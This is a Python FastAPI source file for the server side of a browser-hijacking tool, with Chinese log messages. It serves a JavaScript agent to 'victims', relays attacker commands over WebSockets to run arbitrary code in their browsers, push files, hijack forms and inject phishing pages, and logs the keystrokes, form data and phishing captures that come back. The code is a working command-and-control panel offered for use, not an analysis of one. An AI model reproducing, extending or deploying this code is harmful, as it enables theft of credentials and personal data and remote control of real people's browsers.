from fastapi import FastAPI, WebSocket, WebSocketDisconnect, Request, Form
from fastapi.responses import FileResponse, RedirectResponse, HTMLResponse
from datetime import datetime

def log(msg):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    print(f"[{timestamp}] {msg}")

def get_client_ip(ws: WebSocket) -> str:
    cf_ip = ws.headers.get("cf-connecting-ip")
    if cf_ip:
        return cf_ip
    xff = ws.headers.get("x-forwarded-for")
    if xff:
        return xff.split(",")[0].strip()
    x_real = ws.headers.get("x-real-ip")
    if x_real:
        return x_real
    return ws.client.host

app = FastAPI()

@app.get("/control")
async def control_html(request: Request):
    if request.cookies.get("peeko_auth") != "fe94cff87220ffbb52a8169cd4fd93df":
        log(f"❌ 未授权访问控制面板: {request.client.host}")
        return RedirectResponse("/login")
    log(f"✅ 控制面板访问: {request.client.host}")
    return FileResponse("control.html")

@app.get("/login")
async def login_page():
    return FileResponse("login.html")

@app.post("/login")
async def login_submit(username: str = Form(...), password: str = Form(...), request: Request = None):
    if username == "admin" and password == "123456":
        log(f"✅ 登录成功: {request.client.host}")
        resp = RedirectResponse("/control", status_code=302)
        resp.set_cookie("peeko_auth", "fe94cff87220ffbb52a8169cd4fd93df", httponly=True, samesite="lax")
        return resp
    log(f"❌ 登录失败: {request.client.host} (用户名: {username})")
    return HTMLResponse("登录失败", status_code=401)

@app.get("/min.js")
async def agent_js(request: Request):
    log(f"📥 Agent 下载: {request.client.host}")
    return FileResponse("min.js")

victims = {}
attackers = []
victim_counter = 0

@app.websocket("/ws")
async def websocket_endpoint(ws: WebSocket):
    global victim_counter
    await ws.accept()

    try:
        role = await ws.receive_text()
    except WebSocketDisconnect:
        # 客户端在发送角色标识前就断开了
        log(f"⚠️  WebSocket 连接异常关闭 (未发送角色标识): {get_client_ip(ws)}")
        return
    except Exception as e:
        log(f"⚠️  WebSocket 接收角色标识时出错: {e}")
        return

    if role == "victim":
        victim_counter += 1
        victim_id = f"victim-{victim_counter}"
        victims[victim_id] = ws
        ip = get_client_ip(ws)
        log(f"🟢 受害者已连接: {victim_id} ({ip}) | 在线: {len(victims)}")

        for atk in attackers:
            try:
                await atk.send_text(f"[🟢] 受害者已连接: {victim_id} ({ip})")
            except:
                pass

        try:
            while True:
                response = await ws.receive_text()
                try:
                    import json
                    msg = json.loads(response)
                    if msg.get("type") == "ping":
                        continue
                except:
                    pass
                
                if "[🚨 反调试]" in response:
                    log(f"🚨 {victim_id} 检测到 DevTools")
                elif "[⌨️ 键盘记录]" in response:
                    log(f"⌨️  {victim_id} 键盘记录")
                elif "[📝 表单劫持]" in response:
                    log(f"📝 {victim_id} 表单劫持")
                elif "[收集到的信息]" in response:
                    log(f"📊 {victim_id} 信息收集完成")
                elif "[文件已接收]" in response:
                    log(f"📁 {victim_id} 文件接收")
                elif "[✅ 功能]" in response:
                    log(f"⚙️  {victim_id} 功能配置: {response.split('[✅ 功能]')[1].strip()}")
                elif "[✅ 表单提交成功]" in response:
                    log(f"📝 {victim_id} 表单提交成功")
                elif "[❌ 表单提交失败]" in response:
                    log(f"❌ {victim_id} 表单提交失败")
                elif "[✅ 钓鱼页面已注入]" in response:
                    log(f"🎣 {victim_id} 钓鱼页面已启动")
                elif "[🎣 钓鱼成功]" in response:
                    # 提取完整的钓鱼数据
                    data_part = response.split("[🎣 钓鱼成功]")[1].strip()
                    log(f"🎣 {victim_id} 钓鱼成功")
                    log(f"   {data_part}")
                
                for atk in attackers:
                    try:
                        await atk.send_text(f"[{victim_id}] {response}")
                    except:
                        pass
        except WebSocketDisconnect:
            del victims[victim_id]
            log(f"🔴 受害者已断开: {victim_id} ({ip}) | 在线: {len(victims)}")
            for atk in attackers:
                try:
                    await atk.send_text(f"[🔴] 受害者已断开: {victim_id}")
                except:
                    pass

    elif role == "attacker":
        attackers.append(ws)
        ip = ws.client.host
        log(f"🎯 攻击者已连接: {ip} | 控制端: {len(attackers)}")

        for victim_id, victim_ws in victims.items():
            victim_ip = get_client_ip(victim_ws)
            try:
                await ws.send_text(f"[🟢] 受害者已连接: {victim_id} ({victim_ip})")
            except:
                pass

        try:
            while True:
                command = await ws.receive_text()
                
                if command.startswith("to:"):
                    parts = command.split("|", 1)
                    victim_tag = parts[0][3:]
                    payload = parts[1]
                    if victim_tag in victims:
                        await victims[victim_tag].send_text(payload)
                        if payload.startswith("exec:"):
                            log(f"💉 {victim_tag} ← 执行JS: {payload[5:60]}...")
                        elif payload.startswith("collectinfo:"):
                            log(f"📊 {victim_tag} ← 收集信息")
                        elif payload.startswith("features:"):
                            log(f"⚙️  {victim_tag} ← 配置功能: {payload[9:]}")
                        elif payload.startswith("file:"):
                            filename = payload.split("|")[0][5:]
                            log(f"📁 {victim_tag} ← 下发文件: {filename}")
                        elif payload.startswith("submitform:"):
                            log(f"📝 {victim_tag} ← 提交表单")
                        elif payload.startswith("phishing:"):
                            url = payload[9:]
                            log(f"🎣 {victim_tag} ← 注入钓鱼页面: {url[:60]}")
                        elif payload.startswith("http"):
                            log(f"🌐 {victim_tag} ← 访问: {payload[:80]}")
                    else:
                        await ws.send_text(f"[❌] 未找到受害者 {victim_tag}")
                else:
                    for victim_ws in victims.values():
                        try:
                            await victim_ws.send_text(command)
                        except:
                            pass
                    log(f"📢 广播命令到所有受害者: {command[:60]}")
        except WebSocketDisconnect:
            attackers.remove(ws)
            log(f"🎯 攻击者已断开: {ip} | 控制端: {len(attackers)}")
